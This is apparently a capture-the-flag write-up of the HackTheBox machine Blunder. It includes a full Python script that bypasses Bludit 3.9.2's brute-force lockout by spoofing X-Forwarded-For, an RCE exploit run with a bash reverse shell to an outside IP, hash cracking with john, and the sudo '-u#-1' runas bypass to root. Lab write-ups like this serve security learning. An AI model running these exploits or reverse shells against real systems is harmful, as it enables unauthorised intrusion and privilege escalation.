---
title: Blunder Machine Writeup- HackTheBox
author: 4m0r
date: 2020-08-03 16:00:00 +0530
excerpt: A linux box from HackTheBox- gained foothold by exploiting Bludit CMS vulnerabilities and rooted by vulnerable
         sudo version. This is an active machine, so I highly recommend that you try a bit harder before heading inside.
thumbnail: /assets/img/posts/blunder/info.png
categories: [HackTheBox, Machine]
tags: [linux, CMS, Bludit, sudo]
---

![Info](/assets/img/posts/blunder/info.png)

# Methodology
1. Open Ports Enumeration
2. Web Service Enumeration
3. Bludit CMS Identified
4. Brute Force Protection Bypassed and credentials found
5. Foothold Gained
6. Elevated to *user* through identified hash
7. Vulnerable *sudo* version identified
8. Root shell gained

# Lessons Learned
1. Bludit Brute Force Protection Bypass
2. Privilege Escalation through *sudo*

# Open Ports Enumeration
The open ports enumeration of the target[^f1] had identified only one open service, **HTTP** (80). Though, the scan 
had not listed any known vulnerabilities, it had identified a directory named **admin** on the web service. The results
of the scan are given on the section below.
``` 
[_4m0r@manjaro Blunder]$ targetRecon 10.10.10.191 
[+] Open Ports Scan 
        80      http 
[+] Scripts Scan 
                 nmap -sV -A --script=default,vuln -p 80 10.10.10.191 
 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-03 12:24 IST 
Pre-scan script results: 
| broadcast-avahi-dos:  
|   Discovered hosts: 
|     224.0.0.251 
|   After NULL UDP avahi packet DoS (CVE-2011-1002). 
|_  Hosts are all up (not vulnerable). 
Nmap scan report for 10.10.10.191 (10.10.10.191) 
Host is up (0.30s latency). 
 
PORT   STATE SERVICE VERSION 
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) 
|_clamav-exec: ERROR: Script execution failed (use -d to debug) 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
| http-enum:  
|   /admin/: Possible admin folder 
|   /admin/admin/: Possible admin folder 
|   /admin/account.php: Possible admin folder 
|   /admin/index.php: Possible admin folder 
|   /admin/login.php: Possible admin folder 
|   /admin/admin.php: Possible admin folder 
|   /admin/index.html: Possible admin folder 
|   /admin/login.html: Possible admin folder 
|   /admin/admin.html: Possible admin folder 
|   /admin/home.php: Possible admin folder 
|   /admin/controlpanel.php: Possible admin folder 
|   /admin/account.html: Possible admin folder 
|   /admin/admin_login.html: Possible admin folder 
|   /admin/cp.php: Possible admin folder 
|   /admin/admin_login.php: Possible admin folder 
|   /admin/admin-login.php: Possible admin folder 
|   /admin/home.html: Possible admin folder 
|   /admin/admin-login.html: Possible admin folder 
|   /admin/adminLogin.html: Possible admin folder 
|   /admin/controlpanel.html: Possible admin folder 
|   /admin/cp.html: Possible admin folder 
|   /admin/adminLogin.php: Possible admin folder 
|   /admin/account.cfm: Possible admin folder 
|   /admin/index.cfm: Possible admin folder                                                                                                                                       
|   /admin/login.cfm: Possible admin folder                                                                                                                                       
|   /admin/admin.cfm: Possible admin folder                                                                                                                                       
|   /admin/admin_login.cfm: Possible admin folder                                                                                                                                 
|   /admin/controlpanel.cfm: Possible admin folder                                                                                                                                
|   /admin/cp.cfm: Possible admin folder                                                                                                                                          
|   /admin/adminLogin.cfm: Possible admin folder                                                                                                                                  
|   /admin/admin-login.cfm: Possible admin folder                                                                                                                                 
|   /admin/home.cfm: Possible admin folder                                                                                                                                        
|   /admin/account.asp: Possible admin folder                                                                                                                                     
|   /admin/index.asp: Possible admin folder                                                                                                                                       
|   /admin/login.asp: Possible admin folder                                                                                                                                       
|   /admin/admin.asp: Possible admin folder                                                                                                                                       
|   /admin/home.asp: Possible admin folder                                                                                                                                        
|   /admin/controlpanel.asp: Possible admin folder                                                                                                                                
|   /admin/admin-login.asp: Possible admin folder                                                                                                                                 
|   /admin/cp.asp: Possible admin folder                                                                                                                                          
|   /admin/admin_login.asp: Possible admin folder                                                                                                                                 
|   /admin/adminLogin.asp: Possible admin folder                                                                                                                                  
|   /admin/account.aspx: Possible admin folder                                                                                                                                    
|   /admin/index.aspx: Possible admin folder                                                                                                                                      
|   /admin/login.aspx: Possible admin folder                                                                                                                                      
|   /admin/admin.aspx: Possible admin folder                                                                                                                                      
|   /admin/home.aspx: Possible admin folder                                                                                                                                       
|   /admin/controlpanel.aspx: Possible admin folder                                                                                                                               
|   /admin/admin-login.aspx: Possible admin folder                                                                                                                                
|   /admin/cp.aspx: Possible admin folder                                                                                                                                         
|   /admin/admin_login.aspx: Possible admin folder                                                                                                                                
|   /admin/adminLogin.aspx: Possible admin folder                                                                                                                                 
|   /admin/index.jsp: Possible admin folder                                                                                                                                       
|   /admin/login.jsp: Possible admin folder                                                                                                                                       
|   /admin/admin.jsp: Possible admin folder                                                                                                                                       
|   /admin/home.jsp: Possible admin folder                                                                                                                                        
|   /admin/controlpanel.jsp: Possible admin folder                                                                                                                                
|   /admin/admin-login.jsp: Possible admin folder                                                                                                                                 
|   /admin/cp.jsp: Possible admin folder                                                                                                                                          
|   /admin/account.jsp: Possible admin folder                                                                                                                                     
|   /admin/admin_login.jsp: Possible admin folder                                                                                                                                 
|   /admin/adminLogin.jsp: Possible admin folder                                                                                                                                  
|   /admin/backup/: Possible backup                                                                                                                                               
|   /admin/download/backup.sql: Possible database backup                                                                                                                          
|   /robots.txt: Robots file                                                                                                                                                      
|   /admin/upload.php: Admin File Upload                                                                                                                                          
|   /admin/CiscoAdmin.jhtml: Cisco Collaboration Server                                                                                                                           
|   /.gitignore: Revision control ignore file                                                                                                                                     
|   /admin/libraries/ajaxfilemanager/ajaxfilemanager.php: Log1 CMS                                                                                                                
|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload                                                                      
|   /admin/includes/tiny_mce/plugins/tinybrowser/upload.php: CompactCMS or B-Hind CMS/FCKeditor File upload                                                                       
|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload                                                                        
|   /admin/jscript/upload.php: Lizard Cart/Remote File upload                                                                                                                     
|   /admin/jscript/upload.html: Lizard Cart/Remote File upload                                                                                                                    
|   /admin/jscript/upload.pl: Lizard Cart/Remote File upload                                                                                                                      
|   /admin/jscript/upload.asp: Lizard Cart/Remote File upload                                                                                                                     
|_  /admin/environment.xml: Moodle files                                                                                                                                          
| http-fileupload-exploiter:                                                                                                                                                      
|                                                                                                                                                                                 
|     Couldn't find a file-type field.                                                                                                                                            
|                                                                                                                                                                                 
|     Couldn't find a file-type field.                                                                                                                                            
|                                                                                                                                                                                 
|     Couldn't find a file-type field.                                                                                                                                            
|                                                                                                                                                                                 
|_    Couldn't find a file-type field.                                                                                                                                            
|_http-generator: Blunder                                                                                                                                                         
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                                                                      
| http-sql-injection:                                                                                                                                                             
|   Possible sqli for queries:                                                                                                                                                    
|     http://10.10.10.191:80/bl-kernel/js/?C=N%3bO%3dD%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=M%3bO%3dA%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=S%3bO%3dA%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=D%3bO%3dA%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=M%3bO%3dA%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=S%3bO%3dA%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=N%3bO%3dA%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=D%3bO%3dA%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=N%3bO%3dA%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=M%3bO%3dD%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=S%3bO%3dA%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=D%3bO%3dA%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=M%3bO%3dA%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=N%3bO%3dA%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=S%3bO%3dD%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=D%3bO%3dA%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=N%3bO%3dA%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=M%3bO%3dA%27%20OR%20sqlspider                                                                                                        
|     http://10.10.10.191:80/bl-kernel/js/?C=S%3bO%3dA%27%20OR%20sqlspider                                                                                                        
|_    http://10.10.10.191:80/bl-kernel/js/?C=D%3bO%3dD%27%20OR%20sqlspider                                                                                                        
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                                                                                                  
|_http-title: Blunder | A blunder of interesting facts                                                                                                                            
| vulners:                                                                                                                                                                        
|   cpe:/a:apache:http_server:2.4.41:                                                                                                                                             
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927                                                                                                             
|_      CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934                                                                                                             
                                                                                                                                                                                  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                    
Nmap done: 1 IP address (1 host up) scanned in 1288.20 seconds                                                                                                                    
                                                                                                                                                                                  
[+] Summary  
80      http    Apache httpd 2.4.41 
                No vuln found
```

# Web Enumeration
A *nikto* scan had been done, with no useful information being identified. Browsing to 
[http://10.10.10.191](http://10.10.10.191), had revealed a *blog* filled with interesting facts about *stadia, Stephen 
King* and *USB* (potential wordlist). Browsing to [http://10.10.10.191/admin](http://10.10.10.191/admin) had revealed the 
*login page* for **Bludit CMS** and the source-code of the page had revealed the version of *Bludit* as **3.9.2**. The 
same is shown on the section given below.
 ```html 
---SNIP---
<!-- CSS -->
	<link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2">
<link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/admin/themes/booty/css/bludit.css?version=3.9.2">
<link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/admin/themes/booty/css/bludit.bootstrap.css?version=3.9.2">
---SNIP--- 
```
Google-fu for *Bludit CMS version 3.9.2* had revealed that the version is vulnerable to **directory traversal** with an
 exploit[^f2] on *GitHub* that leverages this into *remote code execution*. The only caveat is that, the exploit found
 is an *authenticated* RCE, and therefore requires a set valid credentials.
<br>
In order to gather credentials, a brute-force with *gobuster* was ran to identify interesting directories and files. The
scan had identified an interesting file named, **todo.txt**. 
``` 
[_4m0r@manjaro Blunder]$ gobuster dir -u http://10.10.10.191 -w /usr/share/dirbuster/directory-list-2.3-medium.txt -x txt,php -t 60
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:            http://10.10.10.191
[+] Method:         GET
[+] Threads:        60
[+] Wordlist:       /usr/share/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.1.0
[+] Extensions:     txt,php
[+] Timeout:        10s
===============================================================
2020/08/03 22:28:15 Starting gobuster in directory enumeration mode
===============================================================
/about (Status: 200)         
/0 (Status: 200)              
/admin (Status: 301)          
/install.php (Status: 200)    
/robots.txt (Status: 200)      
/todo.txt (Status: 200)        
/usb (Status: 200)             
/LICENSE (Status: 200)    
---SNIP---
```
Browsing to [http://10.10.10.191/todo.txt](http://10.10.10.191/todo.txt), had revealed a todo list. From the contents,
a username **fergus** had been identified (to run a focussed brute force attack). The contents of the page are given on 
the section below.
```text
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
```
# Bludit CMS Brute Force
With a valid username identified, brute-forcing the login seemed like a sound option. However, while googling it had been 
found that versions, including and prior to 3.9.2 employ an *anti- brute force mechanism* that blocks users after 10 or 
more incorrect login attempts. A bypass method to this anti-brute force mechanism, along with a *POC*[^f3] had been found
on Google. For a wordlist to go with the brute force, one was generated using *cewl* on the blog as 
```cewl -d 5 http://10.10.10.191 -w /home/_4m0r/HTB/Machines/Blunder/wordlist.txt ```. Using the aforementioned POC, a
python script[^f4] to brute force credentials was written and the same is given below.
```python
#!/usr/bin/env python3

'''
Title: Bludit3.9.2PassBruteForce.py
Description: Bypasses anti-brute forcing mechanism of Bludit CMS v 3.9.2 and brute forces a working password
Application: Bludit 3.9.2
Reference: CVE-2019-17240, https://rastating.github.io/bludit-brute-force-mitigation-bypass/
Author: 4m0r
'''

import re
import requests

host = "http://10.10.10.191" # Change to target URL

login_url = host + '/admin/'
username = 'fergus' # Change to a known username
fname = "/home/_4m0r/HTB/Machines/Blunder/wordlist.txt" # Change to a wordlist of your choice

with open(fname) as f:
    content = f.readlines()
    word1 = [x.strip() for x in content] 

wordlist = word1

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```
The script had brute forced the password for the user fergus as **RolandDeschain** and the same is given on the section
below.
```shell
[_4m0r@manjaro Blunder]$ python Bludit3.9.2PassBruteForce.py  
[*] Trying: the 
[*] Trying: Load 
[*] Trying: Plugins 
[*] Trying: and 
---SNIP---
[*] Trying: fictional 
[*] Trying: character 
[*] Trying: RolandDeschain 
 
SUCCESS: Password found! 
Use fergus:RolandDeschain to login.
```
# User Shell
## Initial Foothold
With a set of working credentials identified, the remote code vulnerability discussed earlier can now be used. The exploit 
from[^f2] *GitHub* was ran with the credentials ***fergus:RolandDeschain***. For the *-c*, command option, a *bash
reverse shell* that sends the shell to port *9095* was used. A reverse shell was received on the netcat listener
when the exploit was executed and the same is given on the section below.
```shell
---TERMINAL-1---
[_4m0r@manjaro Blunder]$ python 48568.py -u http://10.10.10.191 -user fergus -p RolandDeschain -c "bash -c 'bash -i >& /dev/tcp/10.10.14.50/9095 0>&1'" 
 
 
╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔ 
╠╩╗│  │ │ │││ │   ╠═╝║║║║║║ 
╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝ 
 
 CVE-2019-16113 CyberVaca 
 
 
[+] csrf_token: 33a7d577a7d1bf8cf34c206c806dbc8a4e413d4f 
[+] cookie: 5os350q5447e66675fhgb4vde4 
[+] csrf_token: af51b1edfd8cb3f9bc7660da99b4b08481009a08 
[+] Uploading ctjvfntd.jpg 
[+] Executing command: bash -c 'bash -i >& /dev/tcp/10.10.14.50/9095 0>&1' 
[+] Delete: .htaccess 
[+] Delete: ctjvfntd.jpg
 
---TERMINAL-2---
[_4m0r@manjaro Blunder]$ nc -lvnp 9095 
Connection from 10.10.10.191:32834 
bash: cannot set terminal process group (1096): Inappropriate ioctl for device 
bash: no job control in this shell 
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$
```
Upon receiving the shell it had been identified that the shell received was from the user **www-data**, with no 
read access to the user.txt file on */home/hugo*.

## Elevating to **Hugo**
Enumerating with the shell, a file **users.php** had been found on */var/www/bludit-3.9.2/bl-content/databases* that
contained hashes for some users. Further enumeration showed another installation directory of Bludit *version 3.10.0* 
and a similar *users.php* file had been found on */var/www/bludit-3.10.0a/bl-content/databases*. The file held password 
hash for the user **hugo**. The contents of the file is given on the section below.
```php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?> 
{ 
    "admin": { 
        "nickname": "Hugo", 
        "firstName": "Hugo", 
        "lastName": "", 
        "role": "User", 
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d", 
        "email": "", 
        "registered": "2019-11-27 07:40:55", 
        "tokenRemember": "", 
        "tokenAuth": "b380cb62057e9da47afce66b4615107d", 
        "tokenAuthTTL": "2009-03-15 14:00", 
        "twitter": "", 
        "facebook": "", 
        "instagram": "", 
        "codepen": "", 
        "linkedin": "", 
        "github": "", 
        "gitlab": ""} 
}
```

The hash was copied to the attacking host and had been cracked with *john* as **Password120**. The same is shown in the 
section given below.
```shell 
[_4m0r@manjaro Blunder]$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hugo.hash  --format=raw-sha1
Using default input encoding: UTF-8 
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x]) 
Warning: no OpenMP support for this hash type, consider --fork=4 
Press 'q' or Ctrl-C to abort, almost any other key for status 
Warning: Only 1 candidate left, minimum 4 needed for performance. 
Password120      (?) 
1g 0:00:00:01 DONE (2020-08-03 13:55) 0.7194g/s 10318Kp/s 10318Kc/s 10318KC/s Password120
```
With the identified password the session was switched to *hugo* with **su** as ```su hugo``` and the *user* flag was
subsequently read. The same is show on the section given below.
```shell 
www-data@blunder:/home$ su hugo 
su hugo 
Password: Password120 
python -c "import pty;pty.spawn('/bin/bash');" 
hugo@blunder:/home$ cd hugo 
cd hugo 
hugo@blunder:~$ id 
id 
uid=1001(hugo) gid=1001(hugo) groups=1001(hugo) 
hugo@blunder:~$ cat user.txt 
cat user.txt 
fec3d---REDACTED---fcadd
```
![User Shell](/assets/img/posts/blunder/user.png)

# Privilege Escalation
Upon gaining shell as *hugo*, the **sudo** permissions were enumerated and found that they had been restricted to run
*bash* command as the root user.
```shell 
hugo@blunder:~$ sudo -l 
sudo -l 
Password: Password120 
 
Matching Defaults entries for hugo on blunder: 
    env_reset, mail_badpass, 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 
 
User hugo may run the following commands on blunder: 
    (ALL, !root) /bin/bash
```
Enumerating the sudo service further with `sudo -V` had revealed the version as **1.8.25p1**. 
>I know the particular sudo version is vulnerable to bypassing *runas restriction* as I had used it in an earlier 
> occurrence.

Google-Fu identified privilege escalation[^f5][^f6] in the sudo version wherein the user can bypass the *runas 
restriction*by specifying the user ID as either **-1 or 4294967295**. With this knowledge the restriction had been 
bypassed as `sudo -u#-1 /bin/bash` leading to a **root shell**, through which the root flag was read. The same is shown 
on the section given below.
```shell 
hugo@blunder:~$ sudo -u#-1 /bin/bash 
sudo -u#-1 /bin/bash 
Password: Password120 
 
root@blunder:/home/hugo# cd /root 
cd /root 
root@blunder:/root# id 
id 
uid=0(root) gid=1001(hugo) groups=1001(hugo) 
root@blunder:/root# cat root.txt 
cat root.txt 
03e0b---REDACTED---10647
```
![Root Flag](/assets/img/posts/blunder/root.png)

# Footnotes
[^f1]:[targetRecon](https://github.com/4m0r/targetRecon)
[^f2]:[CVE-2019-16113.py](https://github.com/cybervaca/CVE-2019-16113/blob/master/CVE-2019-16113.py)
[^f3]:[Bludit Brute Force Mitigation Bypass](https://rastating.github.io/bludit-brute-force-mitigation-bypass/)
[^f4]:[Bludit3.9.2PassBruteForce.py](https://github.com/4m0r/exploits-and-stuff/blob/master/Bludit3.9.2PassBruteForce.py)
[^f5]:[Runas Restriction Privilege Escalation](https://vuldb.com/?id.143468)
[^f6]:[Potential bypass of Runas user restrictions](https://www.sudo.ws/alerts/minus_1_uid.html)